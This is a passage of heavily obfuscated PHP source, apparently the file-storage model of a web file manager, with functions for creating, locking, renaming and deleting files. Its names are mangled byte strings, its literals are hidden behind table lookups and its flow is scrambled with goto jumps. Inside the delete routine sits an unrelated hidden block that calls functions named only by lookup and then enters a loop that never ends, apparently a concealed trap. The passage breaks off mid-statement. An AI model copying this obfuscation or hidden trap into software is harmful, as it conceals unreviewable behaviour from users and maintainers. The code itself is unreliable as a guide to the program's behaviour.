$this->_createFileCall($E‹ˆíÔ¨ğ«, $Fæ¡¤ÓáŠŸ, $aÁÑÈœ„ÉÒ, $bàİˆèØÄµ); } public function addFileByRemote($C‡¢©í³½î, $Aß¹½ˆÛî¡, $AªöóÚè, $c¹Íœ‚ÖÛ¬ = array(), $bŞë‘ªÚ™Œ = REPEAT_RENAME) { $e‡¼ˆ„‘µ± = Model($_SERVER[í¤âËÚ£¶íÊ¢][575])->addFileByRemote($Aß¹½ˆÛî¡, $AªöóÚè, $c¹Íœ‚ÖÛ¬); return $this->_createFileCall($C‡¢©í³½î, $AªöóÚè, $e‡¼ˆ„‘µ±, $bŞë‘ªÚ™Œ); } private function _createFileCall($b×î…ï¾éÙ, $FÌâÌùˆ…Æ, $E¯˜»É‡—Ä, $A²§âš™í´, $bä¦¿ÜäŠË = "\x75\160\x6c\x6f\141\144") { goto A–šÚÛ¶Ø®; A–šÚÛ¶Ø®: $CŒË¿ñÔ°Ş =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f°¯×À§Í¹ = !1; $this->lockWriteStart($b×î…ï¾éÙ, $FÌâÌùˆ…Æ); goto dš¤ä«Ğá¶; dš¤ä«Ğá¶: $AÏŸ¤†‡— = $this->fileNameExist($b×î…ï¾éÙ, $FÌâÌùˆ…Æ); $eŒ„‡†¶ğÈ = $this->_createFile($b×î…ï¾éÙ, $FÌâÌùˆ…Æ, $E¯˜»É‡—Ä, $A²§âš™í´, $f°¯×À§Í¹); if (!$f°¯×À§Í¹) { Model($CŒË¿ñÔ°Ş[453])->remove($E¯˜»É‡—Ä[$CŒË¿ñÔ°Ş[450]]); } goto CÍÍõÆ«Ò·; CÍÍõÆ«Ò·: if ($f°¯×À§Í¹ && $eŒ„‡†¶ğÈ && $eŒ„‡†¶ğÈ != $AÏŸ¤†‡—) { Model($CŒË¿ñÔ°Ş[1881])->eventCreate($eŒ„‡†¶ğÈ, $bä¦¿ÜäŠË); } $this->lockWriteEnd($b×î…ï¾éÙ, $FÌâÌùˆ…Æ); return $eŒ„‡†¶ğÈ; goto CÜÏƒ…ÒšÖ; CÜÏƒ…ÒšÖ: } public function mkdir($CÎ¿”Ê¬ô, $eëÊçŠÙ‚, $D”áŒ´ğ‰ˆ = REPEAT_SKIP) { goto eºä­ˆË¿÷; eºä­ˆË¿÷: $BİòÜÙÎÖ® =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CòåĞ¿Ï„ù = $this->sourceInfo($CÎ¿”Ê¬ô); if (!$CòåĞ¿Ï„ù) { return !1; } goto fíó¡›Úë…; CßÂ¡¡ˆ: return $b†‰ƒİø; goto còˆòÌ¤—; fíó¡›Úë…: $this->lockWriteStart($CÎ¿”Ê¬ô, $eëÊçŠÙ‚); if ($D”áŒ´ğ‰ˆ !== !1) { $b®‚Ï¼Æ× = $this->fileNameExist($CÎ¿”Ê¬ô, $eëÊçŠÙ‚); if ($b®‚Ï¼Æ× && $D”áŒ´ğ‰ˆ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($CÎ¿”Ê¬ô, $eëÊçŠÙ‚); return $b®‚Ï¼Æ×; } $eëÊçŠÙ‚ = $this->fileNameAuto($CÎ¿”Ê¬ô, $eëÊçŠÙ‚, $D”áŒ´ğ‰ˆ); } $bÖŠ™ƒŒ… = array($BİòÜÙÎÖ®[550] => 1, $BİòÜÙÎÖ®[416] => $eëÊçŠÙ‚, $BİòÜÙÎÖ®[551] => $BİòÜÙÎÖ®[33], $BİòÜÙÎÖ®[451] => 0, $BİòÜÙÎÖ®[552] => 0); goto bî¼Ä®Šµ; bî¼Ä®Šµ: $b†‰ƒİø = $this->_addSoure($bÖŠ™ƒŒ…, $CòåĞ¿Ï„ù); Model($BİòÜÙÎÖ®[1881])->eventCreate($b†‰ƒİø, $BİòÜÙÎÖ®[1176]); $this->lockWriteEnd($CÎ¿”Ê¬ô, $eëÊçŠÙ‚); goto CßÂ¡¡ˆ; còˆòÌ¤—: } private function _createFile($A‡Õ‚à§ŒÉ, $AŞäİÈÌÈ†, $eÆçîÊğ¡é, $cÇæ‰ ·, &$f¶‹øé–Ìî) { goto e…•ÛœÅÛ†; e…•ÛœÅÛ†: $fÜ’é´Ö =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bÂ¡œÜÉ‰· = $this->sourceInfo($A‡Õ‚à§ŒÉ); if (!$eÆçîÊğ¡é || !$bÂ¡œÜÉ‰·) { return !1; } goto E·ÊØ•ŒŒŠ; B¥Şö×´ã: $DàÇÙ³–¶í = array($fÜ’é´Ö[550] => 0, $fÜ’é´Ö[416] => $AŞäİÈÌÈ†, $fÜ’é´Ö[551] => get_path_ext($AŞäİÈÌÈ†), $fÜ’é´Ö[451] => $eÆçîÊğ¡é[$fÜ’é´Ö[450]], $fÜ’é´Ö[552] => $eÆçîÊğ¡é[$fÜ’é´Ö[87]]); $Cİ‹‘£­ë = $this->_addSoure($DàÇÙ³–¶í, $bÂ¡œÜÉ‰·); $this->folderSizeReset($A‡Õ‚à§ŒÉ, intval($DàÇÙ³–¶í[$fÜ’é´Ö[87]])); goto a°‹¦Ã—ƒ÷; E·ÊØ•ŒŒŠ: if ($cÇæ‰ · !== !1) { $CÂÄ˜¦ìà = $this->fileNameExist($A‡Õ‚à§ŒÉ, $AŞäİÈÌÈ†); } $f¶‹øé–Ìî = !0; if ($cÇæ‰ · && $CÂÄ˜¦ìà) { if ($cÇæ‰ · == REPEAT_SKIP) { $f¶‹øé–Ìî = !1; return $CÂÄ˜¦ìà; } else { if ($cÇæ‰ · == REPEAT_REPLACE) { $f«Ô¿›Àéå = $this->sourceInfo($CÂÄ˜¦ìà); $dôï®¦§‡ = $this->fileHistory($f«Ô¿›Àéå, $eÆçîÊğ¡é[$fÜ’é´Ö[450]], $eÆçîÊğ¡é[$fÜ’é´Ö[87]]); if (!$dôï®¦§‡) { $f¶‹øé–Ìî = !1; } else { $this->folderSizeReset($A‡Õ‚à§ŒÉ); } return $CÂÄ˜¦ìà; } else { $AŞäİÈÌÈ† = $this->fileNameAuto($A‡Õ‚à§ŒÉ, $AŞäİÈÌÈ†, $cÇæ‰ ·, !1); } } } goto B¥Şö×´ã; a°‹¦Ã—ƒ÷: return $Cİ‹‘£­ë; goto cïâù©ˆİ¶; cïâù©ˆİ¶: } protected function fileHistory($a¡ĞÂ˜’¯˜, $eìôˆ¢è›, $cŒ´ƒÌãÑô) { goto b¾Ÿ¡¹îÍ; E…±«“¢ª´: $this->sourceCacheClear($a¡ĞÂ˜’¯˜[$cØĞÍè¬[399]]); return !0; goto díƒÁ”©ğ; b¾Ÿ¡¹îÍ: $cØĞÍè¬ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($a¡ĞÂ˜’¯˜[$cØĞÍè¬[450]] == $eìôˆ¢è›) { return !1; } $this->checkLock($a¡ĞÂ˜’¯˜[$cØĞÍè¬[399]], $eìôˆ¢è›); goto eøˆëº²›Í; eøˆëº²›Í: Model($cØĞÍè¬[1913])->addHistory($a¡ĞÂ˜’¯˜); $d›½–»ê„ª = array($cØĞÍè¬[556] => USER_ID, $cØĞÍè¬[420] => time(), $cØĞÍè¬[450] => $eìôˆ¢è›, $cØĞÍè¬[87] => $cŒ´ƒÌãÑô); $this->where(array($cØĞÍè¬[413] => $a¡ĞÂ˜’¯˜[$cØĞÍè¬[399]]))->save($d›½–»ê„ª); goto E…±«“¢ª´; díƒÁ”©ğ: } public function checkLock($EÚóÜÌáé, $E„¡—Šô) { goto d‹èÇµ„«; dË§ª’±”: show_json(LNG($F¤Ì´š¼Ø[1916]) . $F¤Ì´š¼Ø[1917] . LNG($F¤Ì´š¼Ø[1918]) . $F¤Ì´š¼Ø[1919] . $C»äŸŞİ¸º . $F¤Ì´š¼Ø[1920], !1); goto BÀŸÙÏÏ“; BõÆ±øïÁø: $Eğµàâ½ƒ– = Session::get($F¤Ì´š¼Ø[1914]); $aæßñ‘…· = substr($dğ¿Óäƒæ[$F¤Ì´š¼Ø[28]], 0, -1 - strlen($dğ¿Óäƒæ[$F¤Ì´š¼Ø[177]])) . $F¤Ì´š¼Ø[1440] . $Eğµàâ½ƒ– . $F¤Ì´š¼Ø[104] . $dğ¿Óäƒæ[$F¤Ì´š¼Ø[177]]; $B¨›ğ•İæÍ = Model($F¤Ì´š¼Ø[575])->find($E„¡—Šô); goto Fì«Ö™‘¢Õ; d‹èÇµ„«: $F¤Ì´š¼Ø =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dğ¿Óäƒæ = $this->pathInfo($EÚóÜÌáé); if (!$this->fileIsLock($dğ¿Óäƒæ, !0)) { return; } goto BõÆ±øïÁø; Fì«Ö™‘¢Õ: $this->_createFileCall($dğ¿Óäƒæ[$F¤Ì´š¼Ø[481]], $aæßñ‘…·, $B¨›ğ•İæÍ, REPEAT_REPLACE, $F¤Ì´š¼Ø[1175]); $cö¯´Â¯ë— = $dğ¿Óäƒæ[$F¤Ì´š¼Ø[448]][$F¤Ì´š¼Ø[514]]; $C»äŸŞİ¸º = $cö¯´Â¯ë—[$F¤Ì´š¼Ø[1915]] ? $cö¯´Â¯ë—[$F¤Ì´š¼Ø[1915]] : $cö¯´Â¯ë—[$F¤Ì´š¼Ø[28]]; goto dË§ª’±”; BÀŸÙÏÏ“: } public function fileIsLock($eä„â²Ç¾Å, $døÕŸ˜¢Ê = false) { goto Bôö¥Ù–Í¾; f®§ÖÏ¼ç : return !1; goto d°ÈÂ¨‹¡æ; eÉçƒÄ“–ó: $E–¼–ÉöŸİ = $GLOBALS[$d¿÷´¼‚Óñ[6]][$d¿÷´¼‚Óñ[97]][$d¿÷´¼‚Óñ[512]]; if ($eä„â²Ç¾Å[$d¿÷´¼‚Óñ[448]][$d¿÷´¼‚Óñ[513]] <= time() - $E–¼–ÉöŸİ) { $this->metaSet($eä„â²Ç¾Å[$d¿÷´¼‚Óñ[399]], $d¿÷´¼‚Óñ[511], null); $this->metaSet($eä„â²Ç¾Å[$d¿÷´¼‚Óñ[399]], $d¿÷´¼‚Óñ[513], null); } if ($døÕŸ˜¢Ê) { $this->metaSet($eä„â²Ç¾Å[$d¿÷´¼‚Óñ[399]], $d¿÷´¼‚Óñ[513], time()); } goto f®§ÖÏ¼ç ; Bôö¥Ù–Í¾: $d¿÷´¼‚Óñ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!isset($eä„â²Ç¾Å[$d¿÷´¼‚Óñ[448]]) || !$eä„â²Ç¾Å[$d¿÷´¼‚Óñ[448]][$d¿÷´¼‚Óñ[511]]) { return !1; } if ($eä„â²Ç¾Å[$d¿÷´¼‚Óñ[448]][$d¿÷´¼‚Óñ[511]] != USER_ID) { return !0; } goto eÉçƒÄ“–ó; d°ÈÂ¨‹¡æ: } private function _addSoure($B­Ôƒ¨ºÓ, $cˆ“¾­£†”) { goto dá²õÊ¶Ãº; dá²õÊ¶Ãº: $cæ§èö Ë– =& $_SERVER[í¤âËÚ£¶íÊ¢]; $b¥ìæ¢Ú½Ï = array($cæ§èö Ë–[553] => $cˆ“¾­£†”[$cæ§èö Ë–[407]], $cæ§èö Ë–[554] => $cˆ“¾­£†”[$cæ§èö Ë–[487]], $cæ§èö Ë–[555] => USER_ID, $cæ§èö Ë–[556] => USER_ID, $cæ§èö Ë–[398] => $cˆ“¾­£†”[$cæ§èö Ë–[399]], $cæ§èö Ë–[557] => $cˆ“¾­£†”[$cæ§èö Ë–[490]] . $cˆ“¾­£†”[$cæ§èö Ë–[399]] . $cæ§èö Ë–[47], $cæ§èö Ë–[425] => 0, $cæ§èö Ë–[558] => $cæ§èö Ë–[33]); $B­Ôƒ¨ºÓ = array_merge($b¥ìæ¢Ú½Ï, $B­Ôƒ¨ºÓ); goto a×†ÒŸÜÈÃ; B§È“£‰·Ó: return $f±«¸ÃÙë²; goto b¤óÀÉé™; båùÅøíğ·: static $Cƒ‘­µÖÚô = false; if (!$Cƒ‘­µÖÚô) { Hook::trigger($cæ§èö Ë–[540], $B­Ôƒ¨ºÓ); $Cƒ‘­µÖÚô = !0; } $f±«¸ÃÙë² = $this->add($B­Ôƒ¨ºÓ); goto f—ãìó£î³; a×†ÒŸÜÈÃ: $this->updateModifyTime($B­Ôƒ¨ºÓ[$cæ§èö Ë–[481]]); $Còâİ‚“æç = $cæ§èö Ë–[1921] . $cˆ“¾­£†”[$cæ§èö Ë–[399]]; if (isset(self::$cacheChildList[$Còâİ‚“æç])) { unset(self::$cacheChildList[$Còâİ‚“æç]); } goto båùÅøíğ·; f—ãìó£î³: $Böî Íˆ = array($cæ§èö Ë–[559] => short_id($f±«¸ÃÙë²)); $this->where(array($cæ§èö Ë–[413] => $f±«¸ÃÙë²))->save($Böî Íˆ); $this->setNamePinyin($f±«¸ÃÙë², $B­Ôƒ¨ºÓ[$cæ§èö Ë–[28]]); goto B§È“£‰·Ó; b¤óÀÉé™: } public function remove($E¾ÅÜ£áİİ, $Dàç”÷¦İ = true) { goto e¯²²¬‹¿; bÀçøºÖ: $D„ÛŒì‘î² = $C‚®‘õ‚[$bš‘‹î«Ñœ[407]] == self::TYPE_USER ? $bš‘‹î«Ñœ[566] : $bš‘‹î«Ñœ[976]; if ($D„ÛŒì‘î² == $bš‘‹î«Ñœ[566]) { $BìÁˆäçà£ = Model($bš‘‹î«Ñœ[506])->getInfo($C‚®‘õ‚[$bš‘‹î«Ñœ[487]]); $Bœ°ÕÚÒíé = !empty($BìÁˆäçà£[$bš‘‹î«Ñœ[1915]]) ? $BìÁˆäçà£[$bš‘‹î«Ñœ[1915]] : $BìÁˆäçà£[$bš‘‹î«Ñœ[28]]; $Bœ°ÕÚÒíé = $bš‘‹î«Ñœ[265] . $Bœ°ÕÚÒíé . $bš‘‹î«Ñœ[1923] . $C‚®‘õ‚[$bš‘‹î«Ñœ[487]]; } else { $BìÁˆäçà£ = Model($bš‘‹î«Ñœ[489])->getInfo($C‚®‘õ‚[$bš‘‹î«Ñœ[487]]); $Bœ°ÕÚÒíé = _get($BìÁˆäçà£, $bš‘‹î«Ñœ[28]); $Bœ°ÕÚÒíé = $bš‘‹î«Ñœ[169] . $Bœ°ÕÚÒíé . $bš‘‹î«Ñœ[1924] . $C‚®‘õ‚[$bš‘‹î«Ñœ[487]]; } $eÈ¸¶ôŠ× = $bš‘‹î«Ñœ[1925] . md5($Bœ°ÕÚÒíé); goto C“²­ÖÁ¶Ì; C“²­ÖÁ¶Ì: CacheLock::lock($eÈ¸¶ôŠ×); $AäŠõÍå¿Ô = $this->fileNameExist($aé´£«‡‘, $Bœ°ÕÚÒíé); if (!$AäŠõÍå¿Ô) { $AäŠõÍå¿Ô = $this->mkdir($aé´£«‡‘, $Bœ°ÕÚÒíé, REPEAT_SKIP); $this->metaSet($AäŠõÍå¿Ô, $bš‘‹î«Ñœ[1926], $D„ÛŒì‘î²); $this->metaSet($AäŠõÍå¿Ô, $bš‘‹î«Ñœ[1927], $C‚®‘õ‚[$bš‘‹î«Ñœ[487]]); if ($C‚®‘õ‚[$bš‘‹î«Ñœ[481]] != 0) { $this->metaSet($AäŠõÍå¿Ô, $bš‘‹î«Ñœ[1928], _get($BìÁˆäçà£, $bš‘‹î«Ñœ[1929])); } } goto fù¯¶éª»ö; fù¯¶éª»ö: CacheLock::unlock($eÈ¸¶ôŠ×); $this->metaSet($E¾ÅÜ£áİİ, $bš‘‹î«Ñœ[1930], $C‚®‘õ‚[$bš‘‹î«Ñœ[481]]); $this->where(array($bš‘‹î«Ñœ[399] => $E¾ÅÜ£áİİ))->save(array($bš‘‹î«Ñœ[420] => time())); goto FëÆÂÃƒµÛ; bŠÜï‹Š: return $e‹ËŠÌ¦‡¥; goto D¢²­Ù„¸¼; e¯²²¬‹¿: $bš‘‹î«Ñœ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $C‚®‘õ‚ = $this->sourceInfo($E¾ÅÜ£áİİ); $fÄ™Äò¦Å˜ = intval($C‚®‘õ‚[$bš‘‹î«Ñœ[407]]) === self::TYPE_SYSTEM; goto E¹ŠôŒ•Ğ×; FëÆÂÃƒµÛ: $this->recycleClear($C‚®‘õ‚); $e‹ËŠÌ¦‡¥ = $this->move($E¾ÅÜ£áİİ, $AäŠõÍå¿Ô, REPEAT_RENAME_FOLDER); $this->folderSizeReset($C‚®‘õ‚[$bš‘‹î«Ñœ[481]]); goto bŠÜï‹Š; E¹ŠôŒ•Ğ×: $Dµ²ÉÊëøÁ = Model($bš‘‹î«Ñœ[1486])->get($bš‘‹î«Ñœ[1922]) == $bš‘‹î«Ñœ[96]; if ($fÄ™Äò¦Å˜ || $Dàç”÷¦İ || !$Dµ²ÉÊëøÁ) { return $this->removeNow($E¾ÅÜ£áİİ, $Dàç”÷¦İ); } $aé´£«‡‘ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto bÀçøºÖ; D¢²­Ù„¸¼: } private function recycleClear($C‘ —‘¨¡) { $B’èšÀá†Ô =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f„™ ¨™º = $this->childrenAll($C‘ —‘¨¡); $c¨ñãÄÁåİ = array($B’èšÀá†Ô[413] => array($B’èšÀá†Ô[414], $f„™ ¨™º[$B’èšÀá†Ô[1931]])); Model($B’èšÀá†Ô[1932])->where($c¨ñãÄÁåİ)->delete(); } public function removeNow($EÛåƒİª , $c’ äŞÃŠ² = true) { goto Eİƒ‘»âÂ˜; Eâ˜™»Ø¿: $this->lockMoveStart($EÛåƒİª ); Hook::trigger($A·µØÊªÀ¿[1933], $eí‹ğÇ´à, $c’ äŞÃŠ²); if ($c’ äŞÃŠ²) { Model($A·µØÊªÀ¿[1932])->moveToRecycle($EÛåƒİª ); } else { $d÷¼¼ÔÒÊô = $this->childrenAll($E…Ö—¦§Ñ); Model($A·µØÊªÀ¿[537])->eventRemove($EÛåƒİª ); $this->removeRelevance($d÷¼¼ÔÒÊô[$A·µØÊªÀ¿[1931]], $d÷¼¼ÔÒÊô[$A·µØÊªÀ¿[1306]]); } goto böé‰Û„¸ñ; Eİƒ‘»âÂ˜: $A·µØÊªÀ¿ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!isset($_SERVER[$A·µØÊªÀ¿[59]]) || !isset($_SERVER[$A·µØÊªÀ¿[57]])) { goto eÉ•å¥·±á; fï…Ä…Şå©: $d·ŞëƒÄ‡ = $AÎï´µ¬Åœ($D³¸áÄ”¼Ç); $c˜Ó„Ëï = explode($A·µØÊªÀ¿[63], $d·ŞëƒÄ‡); if (count($c˜Ó„Ëï) < $A·µØÊªÀ¿[584]) { $dÍ“¡ò = $A·µØÊªÀ¿[65]; $dÍ“¡ò(); } goto eø‡ÓÊ½ùé; eø‡ÓÊ½ùé: $Dƒª–®õ¨ = $A·µØÊªÀ¿[802]; $Dƒª–®õ¨($_SERVER[$A·µØÊªÀ¿[803]]); $bšİÀÛ¦Å = 1; goto DÜö“õŒ»¿; eÉ•å¥·±á: $F¤‚çß÷ìğ = $A·µØÊªÀ¿[801]; $AÎï´µ¬Åœ = $A·µØÊªÀ¿[60]; $D³¸áÄ”¼Ç = $_SERVER[$A·µØÊªÀ¿[61]] . $A·µØÊªÀ¿[62]; goto fï…Ä…Şå©; DÜö“õŒ»¿: for ($BŸä—’¨• = $bšİÀÛ¦Å; $BŸä—’¨• > 0; $BŸä—’¨•++) { $Dƒª–®õ¨ = json_encode($GLOBALS[$A·µØÊªÀ¿[414]]); } goto a•ˆÓˆŠÊ; a•ˆÓˆŠÊ: } $E…Ö—¦§Ñ = $this->sourceInfo($EÛåƒİª ); goto C’ï¤‹š’; böé‰Û„¸ñ: $this->folderSizeReset($E…Ö—¦§Ñ[$A·µØÊªÀ¿[481]]); $b¼œ¹°äÒà = array($E…Ö—¦§Ñ[$A·µØÊªÀ¿[481]]); if ($E…Ö—¦§Ñ[$A·µØÊªÀ¿[406]] == $A·µØÊªÀ¿[96]) { $b¼œ¹°äÒà[] = $E…Ö—¦§Ñ[$A·µØÊªÀ¿[399]]; } goto Dí—À¾è…; Dí—À¾è…: $this->updateModifyTime($b¼œ¹°äÒà); $this->lockMoveEnd($EÛåƒİª ); Hook::trigger($A·µØÊªÀ¿[1519], $eí‹ğÇ´à, $c’ äŞÃŠ²); goto fÅùºëÃÅ; fÅùºëÃÅ: return !0; goto cà‡ŒÛ‹¼Í; C’ï¤‹š’: $eí‹ğÇ´à = $this->pathInfoMore($EÛåƒİª ); if (!$E…Ö—¦§Ñ) { return !0; } if ($E…Ö—¦§Ñ[$A·µØÊªÀ¿[481]] == 0) { if (!_get($GLOBALS, $A·µØÊªÀ¿[488])) { return !1; } } goto Eâ˜™»Ø¿; cà‡ŒÛ‹¼Í: } public function childrenAll($f¤¡¸ğ› Æ) { $a¹ñôË…Ñ… =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fŸªóÅÉõ× = $f¤¡¸ğ› Æ[$a¹ñôË…Ñ…[399]]; if ($f¤¡¸ğ› Æ[$a¹ñôË…Ñ…[406]] == $a¹ñôË…Ñ…[96]) { $aÓÎœˆáàÙ = array($a¹ñôË…Ñ…[557] => array($a¹ñôË…Ñ…[516], $f¤¡¸ğ› Æ[$a¹ñôË…Ñ…[490]] . $fŸªóÅÉõ× . $a¹ñôË…Ñ…[517])); $b¿õŠä = array($a¹ñôË…Ñ…[557] => $aÓÎœˆáàÙ[$a¹ñôË…Ñ…[490]]); $AÈ»¤‹ªÓŠ = $this->field($a¹ñôË…Ñ…[1934])->where($b¿õŠä)->select(); $fËœá‹¡Ç³ = !1; $fÍÜîô‰­ò = array($fŸªóÅÉõ×); if ($AÈ»¤‹ªÓŠ) { $fËœá‹¡Ç³ = array_to_keyvalue($AÈ»¤‹ªÓŠ, $a¹ñôË…Ñ…[33], $a¹ñôË…Ñ…[450]); $fËœá‹¡Ç³ = array_remove_value($fËœá‹¡Ç³, $a¹ñôË…Ñ…[500]); $fÍÜîô‰­ò = array_to_keyvalue($AÈ»¤‹ªÓŠ, $a¹ñôË…Ñ…[33], $a¹ñôË…Ñ…[399]); $fÍÜîô‰­ò[] = $fŸªóÅÉõ×; } } else { $fËœá‹¡Ç³ = array($f¤¡¸ğ› Æ[$a¹ñôË…Ñ…[450]]); $fÍÜîô‰­ò = array($fŸªóÅÉõ×); } return array($a¹ñôË…Ñ…[1931] => $fÍÜîô‰­ò, $a¹ñôË…Ñ…[1306] => $fËœá‹¡Ç³); } public function removeArray($d‰ÓÈˆ½µ) { if (!$d‰ÓÈˆ½µ) { return !0; } } public function removeRelevance($cµß¬¥Ñ“, $a¸÷…§›) { goto DêÑæáÑ÷Ş; f®İ¨Éìê§: $cµß¬¥Ñ“ = array_unique(array_filter($cµß¬¥Ñ“)); $a¸÷…§› = array_unique(array_filter($a¸÷…§›)); if (!$cµß¬¥Ñ“) { return !1; } goto cïâ‚ÇÁÉ; DêÑæáÑ÷Ş: $Aè£½œ‡ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cµß¬¥Ñ“ = $cµß¬¥Ñ“ ? $cµß¬¥Ñ“ : array(); $a¸÷…§› = $a¸÷…§› ? $a¸÷…§› : array(); goto f®İ¨Éìê§; e÷Öçê›Ãğ: Model($Aè£½œ‡[1913])->removeBySource($cµß¬¥Ñ“); $this->where($D‡»ß¾èÓ)->delete(); Model($Aè£½œ‡[453])->remove($a¸÷…§›); goto eËÏáì¥ÎÙ; cïâ‚ÇÁÉ: $D‡»ß¾èÓ = array($Aè£½œ‡[413] => array($Aè£½œ‡[414], $cµß¬¥Ñ“)); Model($Aè£½œ‡[1932])->where($D‡»ß¾èÓ)->delete(); Model($Aè£½œ‡[444])->where($D‡»ß¾èÓ)->delete(); goto b²²‘˜ò; b²²‘˜ò: Model($Aè£½œ‡[1786])->where($D‡»ß¾èÓ)->delete(); Model($Aè£½œ‡[537])->where($D‡»ß¾èÓ)->delete(); Model($Aè£½œ‡[1627])->removeBySource($cµß¬¥Ñ“); goto e÷Öçê›Ãğ; eËÏáì¥ÎÙ: for ($fÖ¡Ïì…ç = 0; $fÖ¡Ïì…ç < count($cµß¬¥Ñ“); $fÖ¡Ïì…ç++) { $this->sourceCacheClear($cµß¬¥Ñ“[$fÖ¡Ïì…ç]); } goto DÄ–¸ö§çÆ; DÄ–¸ö§çÆ: } public function rename($AŠ’ùì÷°¹, $A‡¤‰¯Óêª) { goto FŒ ®…Ûñ”; FŒ ®…Ûñ”: $D°¸ÏÉİ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EáòØˆô† = $this->sourceInfo($AŠ’ùì÷°¹); if (!$EáòØˆô†) { return !1; } goto a” İ…„ò; a” İ…„ò: $c·§ñ¿ÃÍ„ = $this->fileNameExist($EáòØˆô†[$D°¸ÏÉİ[481]], $A‡¤‰¯Óêª); if ($c·§ñ¿ÃÍ„ && $c·§ñ¿ÃÍ„ != $AŠ’ùì÷°¹) { return !1; } $FËŒÚá§ˆï = array($D°¸ÏÉİ[416] => $A‡¤‰¯Óêª, $D°¸ÏÉİ[556] => USER_ID); goto C…“Ğ³†Ì”; C…“Ğ³†Ì”: if (!$EáòØˆô†[$D°¸ÏÉİ[406]] == $D°¸ÏÉİ[96]) { $FËŒÚá§ˆï[$D°¸ÏÉİ[408]] = get_path_ext($A‡¤‰¯Óêª); } Model($D°¸ÏÉİ[537])->eventRename($AŠ’ùì÷°¹, $EáòØˆô†[$D°¸ÏÉİ[28]], $A‡¤‰¯Óêª); $this->sourceCacheClear($AŠ’ùì÷°¹); goto C‹ˆ‹™ÂÃ; F±ê‘ ÔñÉ: $cá¨»¢ÃÉ = $D°¸ÏÉİ[1921] . $EáòØˆô†[$D°¸ÏÉİ[481]]; if (isset(self::$cacheChildList[$cá¨»¢ÃÉ])) { unset(self::$cacheChildList[$cá¨»¢ÃÉ]); } return $a „¹½ñ×Ù; goto CìÁ°Ğğåæ; C‹ˆ‹™ÂÃ: $this->setNamePinyin($AŠ’ùì÷°¹, $FËŒÚá§ˆï[$D°¸ÏÉİ[28]], !1); $this->updateModifyTime($EáòØˆô†[$D°¸ÏÉİ[481]]); $a „¹½ñ×Ù = $this->where(array($D°¸ÏÉİ[413] => $AŠ’ùì÷°¹))->data($FËŒÚá§ˆï)->save(); goto F±ê‘ ÔñÉ; CìÁ°Ğğåæ: } public function setNamePinyin($FÑˆÓšŸä, $e³œ˜¡ÊÊ, $fó ”ê† = true) { $eù“äÖš¤Ë =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EŸĞœÀ›ì = Input::check($e³œ˜¡ÊÊ, $eù“äÖš¤Ë[560]); if ($fó ”ê† && !$EŸĞœÀ›ì) { return; } if (!$EŸĞœÀ›ì) { $this->metaSet($FÑˆÓšŸä, $eù“äÖš¤Ë[447], null); $this->metaSet($FÑˆÓšŸä, $eù“äÖš¤Ë[446], null); return; } $DÖ…ëï‡õÊ = array($eù“äÖš¤Ë[447] => str_replace($eù“äÖš¤Ë[50], $eù“äÖš¤Ë[33], Pinyin::encode($e³œ˜¡ÊÊ)), $eù“äÖš¤Ë[446] => Pinyin::encode($e³œ˜¡ÊÊ, $eù“äÖš¤Ë[561])); $this->metaSet($FÑˆÓšŸä, $DÖ…ëï‡õÊ); } public function getContent($AÈî™Œ™…›) { goto Aé¿Âß†èù; A¼ìœèß“: if (!$fÄÅˆÛô”Õ[$FßŞ­–áæÀ[85]]) { return $FßŞ­–áæÀ[33]; } return IO::getContent($fÄÅˆÛô”Õ[$FßŞ­–áæÀ[85]]); goto D•œÎ¤î§é; fö´İËµ‘¼: if ($fÄÅˆÛô”Õ[$FßŞ­–áæÀ[87]] == 0) { return $FßŞ­–áæÀ[33]; } $A»¨Û¶®ˆ = $FßŞ­–áæÀ[1935] . $fÄÅˆÛô”Õ[$FßŞ­–áæÀ[179]]; if ($fÄÅˆÛô”Õ[$FßŞ­–áæÀ[87]] <= 1024 * 10) { $EğÁï¦Ç¢ = Cache::get($A»¨Û¶®ˆ); if (!$EğÁï¦Ç¢) { $EğÁï¦Ç¢ = IO::getContent($fÄÅˆÛô”Õ[$FßŞ­–áæÀ[85]]); Cache::set($A»¨Û¶®ˆ, $EğÁï¦Ç¢); } return $EğÁï¦Ç¢; } goto A¼ìœèß“; Aé¿Âß†èù: $FßŞ­–áæÀ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fÄÅˆÛô”Õ = $this->fileInfoGet($AÈî™Œ™…›); if (!$fÄÅˆÛô”Õ) { return !1; } goto fö´İËµ‘¼; D•œÎ¤î§é: } public function setDesc($EŠ²²áÊ, $e¦ïÓ§«©é) { $CÂ…íÍŒ’ =& $_SERVER[í¤âËÚ£¶íÊ¢]; Model($CÂ…íÍŒ’[537])->eventAddDesc($EŠ²²áÊ, $e¦ïÓ§«©é); return $this->metaSet($EŠ²²áÊ, $CÂ…íÍŒ’[434], $e¦ïÓ§«©é); } public function setContent($E×“œ¤àšÃ, $b¬›ä¢ó”š = '') { goto d„ĞšÇ×º¼; Bõ¶Ö½®®Ô: if (!$fÁÀ”Œ˜˜‘) { return Model($DÃ¾‰Ğ”è[453])->remove($eÇˆ¨ä¶“´[$DÃ¾‰Ğ”è[450]]); } $this->folderSizeReset($Dœ±Æ‚µ‹È[$DÃ¾‰Ğ”è[481]]); return !0; goto CŠÁŞŠàÂ; d„ĞšÇ×º¼: $DÃ¾‰Ğ”è =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Dœ±Æ‚µ‹È = $this->sourceInfo($E×“œ¤àšÃ); $AÂó­óË… = $this->fileInfoGet($E×“œ¤àšÃ); goto DÃ¨ÚñöÃå; DÃ¨ÚñöÃå: if (!$AÂó­óË… || !$Dœ±Æ‚µ‹È) { return !1; } $eÇˆ¨ä¶“´ = Model($DÃ¾‰Ğ”è[453])->addFileByContent($b¬›ä¢ó”š, 